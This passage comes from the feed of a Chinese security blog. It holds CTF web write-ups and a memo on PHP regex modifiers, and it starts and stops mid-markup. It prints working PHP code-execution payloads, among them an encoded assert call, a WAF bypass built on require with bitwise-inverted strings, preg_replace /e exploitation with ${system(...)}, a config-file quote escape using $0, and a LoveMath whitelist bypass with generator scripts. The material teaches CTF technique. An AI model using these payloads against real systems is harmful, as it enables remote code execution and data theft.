%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b&#x2F;&#x2F;</code></pre><p>因为携带许多不可打印的字符，所以需要经过url编码后发包传入，以上代码翻译过来就是：<code>ASSERT($_POST[_]);</code>，即可<code>post</code>一个<code>_</code>，字符执行代码，<code>_=system(&#39;cat /flag&#39;);</code>，即可拿到<code>flag</code></p><h3 id="WEB-给你shell"><a href="#WEB-给你shell" class="headerlink" title="WEB_给你shell"></a>WEB_给你shell</h3><p>F12看到源码，且有个提示<code>flag is in /flag.txt</code>：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;It&#39;s no need to use scanner. Of course if you want, but u will find nothing.error_reporting(0);include &quot;config.php&quot;;if (isset($_GET[&#39;view_source&#39;])) &#123;    show_source(__FILE__);    die;&#125;function checkCookie($s) &#123;    $arr &#x3D; explode(&#39;:&#39;, $s);    if ($arr[0] &#x3D;&#x3D;&#x3D; &#39;&#123;&quot;secret&quot;&#39; &amp;&amp; preg_match(&#39;&#x2F;^[\&quot;0-9A-Z]*&#125;$&#x2F;&#39;, $arr[1]) &amp;&amp; count($arr) &#x3D;&#x3D;&#x3D; 2 ) &#123;        return true;    &#125; else &#123;        if ( !theFirstTimeSetCookie() ) setcookie(&#39;secret&#39;, &#39;&#39;, time()-1);        return false;    &#125;&#125;function haveFun($_f_g) &#123;    $_g_r &#x3D; 32;    $_m_u &#x3D; md5($_f_g);    $_h_p &#x3D; strtoupper($_m_u);    for ($i &#x3D; 0; $i &lt; $_g_r; $i++) &#123;        $_i &#x3D; substr($_h_p, $i, 1);        $_i &#x3D; ord($_i);        print_r($_i &amp; 0xC0);    &#125;    die;&#125;isset($_COOKIE[&#39;secret&#39;]) ? $json &#x3D; $_COOKIE[&#39;secret&#39;] : setcookie(&#39;secret&#39;, &#39;&#123;&quot;secret&quot;:&quot;&#39; . strtoupper(md5(&#39;y1ng&#39;)) . &#39;&quot;&#125;&#39;, time()+7200 );checkCookie($json) ? $obj &#x3D; @json_decode($json, true) : die(&#39;no&#39;);if ($obj &amp;&amp; isset($_GET[&#39;give_me_shell&#39;])) &#123;    ($obj[&#39;secret&#39;] !&#x3D; $flag_md5 ) ? haveFun($flag) : echo &quot;here is your webshell: $shell_path&quot;;&#125;die;</code></pre><p>代码审计后发现是需要<code>get</code>一个<code>give_me_shell</code>，随后才可以进入函数中的三目运算符进行信息的读取，且需要<code>$obj[&#39;secret&#39;] == $flag_md5(推测为$flag的md5值)</code>，才可以进行<code>echo &quot;here is your webshell: $shell_path&quot;;</code>操作</p><p>第一个三目运算符处可以设置一个名为<code>secret</code>的<code>cookie</code>，如果未设置的话系统就会自动帮你设置，随后设置的<code>cookie</code>，<code>secret</code>赋值给<code>$json</code>，进入<code>checkCookie</code>函数，观察函数可得知<code>$json</code>中的格式需要满足一个<code>json</code>的格式，且<code>json</code>中<code>secret</code>值的格式需满足<code>&#39;/^[\&quot;0-9A-Z]*&#125;$/&#39;</code>，然后才能返回<code>true</code>，进入<code>json_decode</code>，将<code>secret</code>的值解析出来，否则<code>die(&#39;no&#39;);</code>，于是我们先传入一个满足条件的<code>secret</code>cookie，看看<code>haveFun($flag)</code>函数返回什么，发包后发现返回这样的一个字符串0006464640064064646464006406464064640064006400000000000，为<code>$flag</code>经过<code>haveFun</code>函数后返回的值，观察函数，其中对<code>$flag</code>进行了md5加密后，对其中的每一个字符都经过<code>ord</code>函数与<code>0xC0</code>经过了与运算</p><p>测试后发现，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64，那么则可以确定<code>$flag</code>的前三位为数字，那么我们只需要因为<code>$obj[&#39;secret&#39;] != $flag_md5</code>此处为弱比较，所以我们只需要让<code>$obj[&#39;secret&#39;]</code>，（也就是传入cookie中 secret 值中的secret的值）前三位和<code>$flag_md5</code>的前三位数字相等即可，于是放到burp中爆破，得到<code>secret=&#123;&quot;secret&quot;:115&#125;</code>，随后得到<code>$shell_path</code>信息： <code>here is your webshell: w3b5HeLLlll123.php</code></p><p>访问<code>w3b5HeLLlll123.php</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);session_start();&#x2F;&#x2F;there are some secret waf that you will never know, fuzz me if you canrequire &quot;hidden_filter.php&quot;;if (!$_SESSION[&#39;login&#39;])    die(&#39;&lt;script&gt;location.href&#x3D;\&#39;.&#x2F;index.php\&#39;&lt;&#x2F;script&gt;&#39;);if (!isset($_GET[&#39;code&#39;])) &#123;    show_source(__FILE__);    exit();&#125; else &#123;    $code &#x3D; $_GET[&#39;code&#39;];    if (!preg_match($secret_waf, $code)) &#123;        &#x2F;&#x2F;清空session 从头再来        eval(&quot;\$_SESSION[&quot; . $code . &quot;]&#x3D;false;&quot;); &#x2F;&#x2F;you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker    &#125; else die(&#39;hacker&#39;);&#125;&#x2F;* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember … we are legion! *  ————Deep CTF 2020*&#x2F;</code></pre><p>发现<code>eval</code>函数，于是传入code，但是经过了<code>preg_match</code>，并且<code>$secret_waf</code>没给出来，fuzz测试后发现过滤了大多数字符，括号、引号、分号、空格 、反引号、/ \ $ * # ^ &amp;等符号，并且f、sys、include也被过滤，这里直接给出payload：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><ul><li><code>]=1?&gt;</code>闭合前面的中括号和php代码，随后执行一句话php代码</li><li>~为反转字符串根据源码提示读取<code>/flag.txt</code></li><li>使用<code>require</code>可以不需要括号</li><li><code>require</code>和<code>~</code>之间不需要空格就可以执行</li></ul><p>得到<code>flag.txt</code>内容：</p><pre class="language-none"><code class="language-none">可以，说明你ctfshow的红包2没白做，flag在&#x2F;flag，同样的方法去读取吧。1]&#x3D;false;</code></pre><p>再读<code>/flag</code>：<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>得到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“温故而知新，可以为师矣”——孔子《论语》&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>php正则表达式(PCRE)模式修饰符</title>
    <link href="https://www.extrader.top/posts/57833c1a/"/>
    <id>https://www.extrader.top/posts/57833c1a/</id>
    <published>2020-05-19T10:24:20.000Z</published>
    <updated>2020-07-14T12:46:48.344Z</updated>
    
    <content type="html"><![CDATA[<p>php单双引号的区别：</p><p>单引号：php不会读取里面的变量，作为纯字符串处理</p><p>双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如<code>\n</code>，<code>\0</code>等</p><p>处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，<a href="https://www.laruence.com/2008/08/19/338.html">详见</a></p><a id="more"></a><h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><strong>i (PCRE_CASELESS)</strong></h3><p>使得模式大小写不敏感</p><p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt loading="lazy"></p><h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><strong>m (PCRE_MULTILINE)</strong></h3><p>使得模式匹配上任意行之后就返回true</p><p>默认情下，PCRE认为目标字符串是由单行字符组成的<strong>(然而实际上可能会包含多行)</strong>，”行首“元字符<code>(^)</code>仅匹配字符串的开始位置，而”行末“元字符<code>($)</code>仅匹配字符串末尾，或者最后的换行符<strong>(除非设置了D修饰符)</strong>。但也仅仅是行首行末，当这个修饰符设置后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外，还分别匹配目标字符串的最开始和最末尾位置，当我们在待匹配的<code>subject</code>处传入一个换行符<strong>(即%0a)</strong>的时候，换行符前的匹配上后，即使后面的匹配不上，表达式会返回1，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt loading="lazy"></p><p>如果<code>/m</code>使用不当就会存在漏洞从而绕过某些限制</p><h3 id="s-PCRE-DOTALL"><a href="#s-PCRE-DOTALL" class="headerlink" title="s (PCRE_DOTALL)"></a><strong>s (PCRE_DOTALL)</strong></h3><p>使得<code>.</code>可以匹配换行符</p><p>如果设置了这个修饰符，模式中的点号<code>(.)</code>字符匹配所有的字符，<strong>包含换行符</strong>，如果没有这个修饰符，点号不匹配换行符，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519221410216.png" alt loading="lazy"></p><h3 id="D-PCRE-DOLLAR-ENDONLY"><a href="#D-PCRE-DOLLAR-ENDONLY" class="headerlink" title="D (PCRE_DOLLAR_ENDONLY)"></a><strong>D (PCRE_DOLLAR_ENDONLY)</strong></h3><p>使得<code>$</code>不匹配换行符</p><p>如果设置了这个修饰符，模式中的元字符美元符号<code>($)</code>，仅仅匹配目标字符串的末尾，如果这个修饰符没有设置，当字符串以一个换行符结尾时，美元符号还会匹配该换行符<strong>(但不会匹配之前的任何换行符)</strong>，如果设置了修饰符<em>m</em>，这个修饰符被忽略。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520165220099.png" alt loading="lazy"></p><h3 id="x-PCRE-EXTENDED"><a href="#x-PCRE-EXTENDED" class="headerlink" title="x (PCRE_EXTENDED)"></a><strong>x (PCRE_EXTENDED)</strong></h3><p>使得可以在模式中添加注释</p><p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略，并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。注意：这仅用于数据字符。 空白字符还是不能在模式的特殊字符序列中出现。如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520171421233.png" alt loading="lazy"></p><h3 id="e-PREG-REPLACE-EVAL"><a href="#e-PREG-REPLACE-EVAL" class="headerlink" title="e (PREG_REPLACE_EVAL)"></a><strong>e (PREG_REPLACE_EVAL)</strong></h3><p>这个功能在php5.5.0中已弃用，在php7.0.0中已删除</p><p>如果设置了这个被弃用的修饰符，<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace()</a> 在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码评估执行(<code>eval</code>函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线<code>(\)</code>和 NULL 字符在后向引用替换时会被用反斜线转义。以下是典型的一种利用方法</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520173908256.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520174020072.png" alt loading="lazy"></p><p>虽然传入引号会被转义，但是这并不会影响我们<code>getshell</code>，令第三个参数为<code>&#123;$&#123;system($_POST[1])&#125;&#125;</code>即可<code>POST</code>命令执行参数，这里注意需要匹配到<code>$&#123;&#125;</code>这种类似的符号包裹着代码的才能进行命令执行，是因为<a href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a>的原因，<code>$&#123;&#125;</code>中包裹的字符则会当做代码执行</p><h3 id="A-PCRE-ANCHORED"><a href="#A-PCRE-ANCHORED" class="headerlink" title="A (PCRE_ANCHORED)"></a><strong>A (PCRE_ANCHORED)</strong></h3><p>如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来(如：<code>^</code>)。简单来讲就是表达式必须是匹配字符串中的开头部分</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520175528269.png" alt loading="lazy"></p><h3 id="U-PCRE-UNGREEDY"><a href="#U-PCRE-UNGREEDY" class="headerlink" title="U(PCRE_UNGREEDY)"></a><strong>U(PCRE_UNGREEDY)</strong></h3><p>这个修饰符逆转了量词的”贪婪”模式。 如果使用这个修饰符，会使量词默认为非贪婪的，通过量词后紧跟<code>?</code>的方式可以使其成为贪婪的。逆转贪婪功能</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520182001826.png" style="zoom: 67%;" loading="lazy"><h3 id="X-PCRE-EXTRA"><a href="#X-PCRE-EXTRA" class="headerlink" title="X(PCRE_EXTRA)"></a><strong>X(PCRE_EXTRA)</strong></h3><p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p><h3 id="J-PCRE-INFO-JCHANGED"><a href="#J-PCRE-INFO-JCHANGED" class="headerlink" title="J(PCRE_INFO_JCHANGED)"></a><strong>J(PCRE_INFO_JCHANGED)</strong></h3><p>内部选项设置<code>(?J)</code>修改本地的<em>PCRE_DUPNAMES</em>选项。允许子组重名。 (译注：只能通过内部选项设置，外部的 <code>/J</code> 设置会产生错误。)</p><h3 id="u-PCRE-UTF8"><a href="#u-PCRE-UTF8" class="headerlink" title="u(PCRE_UTF8)"></a><strong>u(PCRE_UTF8)</strong></h3><p>此修正符打开一个与 <code>perl</code> 不兼容的附加功能。模式和目标字符串都被认为是<code>utf-8</code>的。 无效的目标字符串会导致 <code>preg_*</code> 函数什么都匹配不到； 无效的模式字符串会导致 <code>E_WARNING</code> 级别的错误。PHP5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效<code>(resp. PCRE 7.3 2007-08-28)</code>。 以前就被认为是无效的 UTF-8。</p><h3 id="S"><a href="#S" class="headerlink" title="S"></a><strong>S</strong></h3><p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p><h3 id="匹配换行问题"><a href="#匹配换行问题" class="headerlink" title="$匹配换行问题"></a><strong>$匹配换行问题</strong></h3><p>在多行模式下，因为是多行模式，所以<code>$</code>可以匹配每一行的结尾，且不会匹配换行符</p><p>在单行模式下，将整个文本视为一行，所以<code>$</code>匹配的是文本的结尾，且包括结尾的换行符</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520163746726.png" alt loading="lazy"></p><p>例如Apache的换行解析漏洞，因为<code>$</code>能匹配<code>\n</code>，所以上传<code>shell.php\n</code>，仍然可以让Apache解析php文件</p><p>那么该如何解决这种问题呢？</p><p>在php中有一个修饰符<code>D</code>，<code>D</code>是php中独有的修饰符，其作用是告诉引擎<code>$</code>仅匹配文本结尾，不再匹配到一个换行符，在php中可以用<code>D</code>修饰符来解决问题，那么不在php环境下呢？在此之前就需要屡一下正则中具有“首尾”界定符意思的字符：</p><ul><li><code>^</code></li><li><code>$</code></li><li><code>\A</code></li><li><code>\Z</code></li><li><code>\z</code></li></ul><p>第三个<code>\A</code>表示“字符串的开头”，第四个<code>\Z</code>表示行的结尾，其效果其实和<code>$</code>完全一样，第五个<code>\z</code>，表示“字符串的结尾”，所以<code>\A</code>和<code>\z</code>这两个界定符才是真正表示“字符串开头”和“字符串结尾”的，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200520170351144.png" alt loading="lazy"></p><h3 id="正则替换"><a href="#正则替换" class="headerlink" title="正则替换"></a><strong>正则替换</strong></h3><p>利用<code>$0</code>来进行正则替换使符号逃逸</p><p>有如下代码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$api &#x3D; addslashes($_GET[&#39;api&#39;]);$file &#x3D; file_get_contents(&#39;.&#x2F;option.php&#39;);$file &#x3D; preg_replace(&quot;&#x2F;\\\$API &#x3D; &#39;.*&#39;;&#x2F;s&quot;, &quot;\$API &#x3D; &#39;&#123;$api&#125;&#39;;&quot;, $file);file_put_contents(&#39;.&#x2F;option.php&#39;, $file);</code></pre><p>我们可以对<code>option.php</code>进行写操作，下面看如何利用<code>$0</code>来绕过这个正则的限制</p><p>传入<code>?api=;phpinfo();</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$API &#x3D; &#39;;phpinfo();&#39;;</code></pre><p>再传入<code>?api=$0</code>，<code>option.php</code>中的内容变成了</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$API &#x3D; &#39;$API &#x3D; &#39;;phpinfo();&#39;;&#39;;</code></pre><p>成功使得单引号逃逸，造成代码执行，$0等的使用方法：</p><ul><li><code>$1</code>表示捕获组1，<code>$0</code>表示整个匹配组。</li><li>如果<code>$1</code>后面紧接一个数字，则需要写成<code>\$&#123;1&#125;</code>的形式。</li></ul><p>再来看看<code>preg_replace</code>的具体使用方法</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php正则表达式模式修饰符/image-20200520192912940.png" style="zoom: 80%;" loading="lazy"><h3 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a><strong>巨人的肩膀</strong></h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li><li><a href="https://www.smi1e.top/%e5%b0%8f%e5%af%86%e5%9c%88%e7%bb%8f%e5%85%b8%e5%86%99%e9%85%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e%e4%b8%8e%e5%87%a0%e7%a7%8d%e5%8f%98%e5%bd%a2%e5%ad%a6%e4%b9%a0/">[小密圈]经典写配置漏洞与几种变形学习</a></li><li><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></li><li><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">PHP模式修饰符</a></li></ul><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a><em>栗子</em></h3><h4 id="BJDCTF2020-ZJCTF—不过如此"><a href="#BJDCTF2020-ZJCTF—不过如此" class="headerlink" title="BJDCTF2020-ZJCTF—不过如此"></a><strong>BJDCTF2020-ZJCTF—不过如此</strong></h4><p>首先题目先给出了一段代码：</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;    echo (file_get_contents($text,&#39;r&#39;));    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  &#x2F;&#x2F;next.php    &#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>构造<code>payload</code>读取<code>next.php</code>的内容</p><pre class="language-php" data-language="php"><code class="language-php">http:&#x2F;&#x2F;e4d6525b-eb85-41c7-9bbb-f48802a4eb3a.node3.buuoj.cn?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre><p>将读到的base64解码得到<code>next.php</code>文件的内容</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$id &#x3D; $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] &#x3D; $id;function complex($re, $str) &#123;    return preg_replace(        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );&#125;foreach($_GET as $re &#x3D;&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><p>看到了<code>complex</code>方法中的<code>preg_replace</code>函数，里面的正则表达式使用了<code>e</code>修饰符，利用上面的原理构造：</p><p><code>payload</code>：<code>?\S*=$&#123;system($_POST[1])&#125;</code>   POST:<code>1=cat /flag;</code>即可拿到<code>flag</code>，</p><p>也可以利用里面的<code>getFlag</code>方法<code>?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=highlight_file(&#39;/flag&#39;);</code>也可以拿到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php单双引号的区别：&lt;/p&gt;
&lt;p&gt;单引号：php不会读取里面的变量，作为纯字符串处理&lt;/p&gt;
&lt;p&gt;双引号：PHP会尝试读取里面的变量，或者反斜杠表示的特殊符号，例如&lt;code&gt;\n&lt;/code&gt;，&lt;code&gt;\0&lt;/code&gt;等&lt;/p&gt;
&lt;p&gt;处理字符串变量替换的连接速度方面，php7前单引号会快些，而在php7之后就没区别了，&lt;a href=&quot;https://www.laruence.com/2008/08/19/338.html&quot;&gt;详见&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="正则" scheme="https://www.extrader.top/tags/%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-LoveMath-php动态函数执行</title>
    <link href="https://www.extrader.top/posts/a649e496/"/>
    <id>https://www.extrader.top/posts/a649e496/</id>
    <published>2020-05-17T09:53:48.000Z</published>
    <updated>2020-07-14T12:52:02.649Z</updated>
    
    <content type="html"><![CDATA[<p>  先看到题目给出的源码：</p><a id="more"></a><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p>代码审计限制条件</p><ul><li>传入的<code>c</code>的字符串长度大小不能大于80</li><li>传入的字符串不能包含<code>&#39; &#39;</code>, <code>&#39;\t&#39;</code>, <code>&#39;\r&#39;</code>, <code>&#39;\n&#39;</code>,<code>&#39;\&#39;&#39;</code>, <code>&#39;&quot;&#39;</code>, <code>&#39;``&#39;</code>, <code>&#39;\[&#39;</code>, <code>&#39;\]&#39;</code></li><li><code>preg_match_all</code>将匹配到的结果传给<code>$used_funcs</code>，<code>$used_funcs</code>只能是<code>$whitelist</code>中的函数，意识就是传入的字符串中的词组也只能是<code>$whitelist</code>中的单词</li></ul><p>以上条件满足后即可传入<code>eval</code>中执行代码</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;$pi&#x3D;base_convert(3761671484,13,36)(dechex(1598506324));($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1&#x3D;system&amp;2&#x3D;tac &#x2F;flag</code></pre><p>分析：</p><ul><li><code>base_convert</code>函数的功能是在任意进制的字符串之间转换数字<code>base_convert(37907361743,10,36)  ==&gt;  hex2bin</code></li><li><code>dechex(1598506324)  ==&gt;  5f474554</code>，<code>hex2bin(&quot;5f474554&quot;)  ==&gt;  _GET</code></li><li>选用<code>pi</code>的原因是因为题目有长度限制，白名单中最短的就是这两个字符<code>pi</code>，故选它</li><li>当<code>$pi</code>=<code>_GET</code>之后再在前面加一个<code>$</code>就形成了<code>$_GET</code></li><li><code>($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)</code>翻译过来就是<code>($_GET)&#123;1&#125;(($_GET)&#123;2&#125;) === $_GET[1]($_GET[2])</code>，传入<code>1=system</code>即可进行命令执行</li></ul><p>举一反三，那么我们改如何构造出这种方法呢？<code>base_convert</code>的进制转换不知道的话又怎么知道该传入什么数字和进制呢？于是写出构造脚本：</p><p><code>base_convert</code>函数构造：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &#39;hex2bin&#39;;for($i &#x3D; 2; $i &lt; 37; $i++)&#123;    for($j &#x3D; 2; $j &lt; 37; $j++)&#123;        if(is_numeric(base_convert($a, $i, $j)))&#123;            if(base_convert(base_convert($a, $i, $j), $j, $i) &#x3D;&#x3D;&#x3D; $a)&#123;                echo &#39;len&#x3D;&#39;.strlen(base_convert($a, $i, $j)).&#39; &#39;.&#39;base_convert参数-&gt;&#39;.base_convert($a, $i, $j).&#39; &#39;.$j.&#39; &#39;.$i.&#39; &#39;.&quot;\n&quot;;            &#125;        &#125;    &#125;&#125;?&gt;</code></pre><p>这样即可得到所有的进制转换结果，当然如果题目没有引号限制，<code>is_numeric</code>函数也可以去掉，在里面选取所需要的即可</p><p>那么<code>dechex</code>如何构造呢？这个就简单了，两行代码就可以搞定</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a &#x3D; &quot;_GET&quot;;$num &#x3D; hexdec(bin2hex($a));echo $num . &quot;\n&quot;;echo (base_convert(3761671484,13,36)(dechex($num)));?&gt;</code></pre><p>输出的结果既是可传入的值</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre class="language-php" 